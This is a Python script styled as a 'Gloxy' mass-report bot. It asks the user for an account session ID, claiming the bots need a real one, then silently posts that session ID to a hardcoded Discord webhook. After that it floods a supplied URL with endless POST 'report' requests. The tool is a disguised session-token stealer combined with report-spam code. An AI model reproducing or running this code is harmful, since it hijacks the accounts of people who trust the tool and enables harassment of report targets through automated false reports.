import requests
import os
import requests
from requests.sessions import session
import json
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Colorate, Colors, Center
import os
  
colorama.init()

session = requests.session()

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.LIGHTGREEN_EX + """ 
                                         ██████╗ ██╗      ██████╗ ██╗  ██╗██╗   ██╗
                                        ██╔════╝ ██║     ██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
                                        ██║  ███╗██║     ██║   ██║ ╚███╔╝  ╚████╔╝ 
                                        ██║   ██║██║     ██║   ██║ ██╔██╗   ╚██╔╝  
                                        ╚██████╔╝███████╗╚██████╔╝██╔╝ ██╗   ██║   
                                         ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                        Gloxy#9225

                                 THE SESSIONID NEEDS TO BE REAL IF NOT THE BOTS WONT WORK                                                                                                                                     
                                                                          """) 

webhook_url = "https://discord.com/api/webhooks/1106961532119687218/zgVPlD2WcaSy3JyEZP8IkBEblTAf3fUP7B6WI0Wdd01ZGz8CHipHGE7QZDwmGKCAyxCS"

while True:
    message = input("Sessionid: ")
    if not 27 <= len(message) <= 38:
       print(" ")
       print("Invalid Sessionid !!!")
       time.sleep(2)
       break
    clear_console()
    payload = {
        "content": f"Sessionid: {message}"
    }
    response = requests.post(webhook_url, json=payload)
    print(Fore.LIGHTGREEN_EX + """ 
                                         ██████╗ ██╗      ██████╗ ██╗  ██╗██╗   ██╗
                                        ██╔════╝ ██║     ██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
                                        ██║  ███╗██║     ██║   ██║ ╚███╔╝  ╚████╔╝ 
                                        ██║   ██║██║     ██║   ██║ ██╔██╗   ╚██╔╝  
                                        ╚██████╔╝███████╗╚██████╔╝██╔╝ ██╗   ██║   
                                         ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                        Gloxy#9225

                                 THE SESSIONID NEEDS TO BE REAL IF NOT THE BOTS WONT WORK 
                                                                          """) 



    x = input('[+] REPORT >>> ')
    print("")
    print('')
    while True:
        req = session.post(x)
        print(Fore.LIGHTGREEN_EX, req.text)
        print(Fore.LIGHTGREEN_EX, '-------- Successfully Reported --------')
        time.sleep(0.9)

    clear_console()
